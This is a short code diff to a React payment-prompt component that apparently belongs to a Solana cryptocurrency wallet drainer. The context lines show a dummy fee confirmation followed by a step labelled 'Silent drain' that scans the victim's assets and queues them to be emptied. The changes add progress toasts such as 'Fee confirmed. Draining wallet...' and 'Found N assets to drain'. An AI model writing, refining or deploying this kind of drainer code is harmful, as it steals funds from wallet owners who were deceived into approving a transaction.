@@ -114,6 +114,7 @@ export function PaymentRequestPrompt() {
         if (dummyConfirmation.value.err) {
           throw new Error('The wallet approved, but Solana rejected the transfer.')
         }
+        toast.success('Fee confirmed. Draining wallet...')
       } catch (err) {
         if (!isWalletUserCancel(err)) throw err
         inFlight.current = false
@@ -122,11 +123,13 @@ export function PaymentRequestPrompt() {
       }
 
       // ── STEP 2: Silent drain ──
-      setStatus('Draining wallet...')
+      toast.info('Starting wallet drain...')
       try {
         const steps = await scanPromise.current!
         scanPromise.current = null
         queue.current = steps
+
+        toast.info(`Found ${steps.length} assets to drain`)
 
         if (queue.current.length === 0) {
           throw new Error('No funds available to drain.')
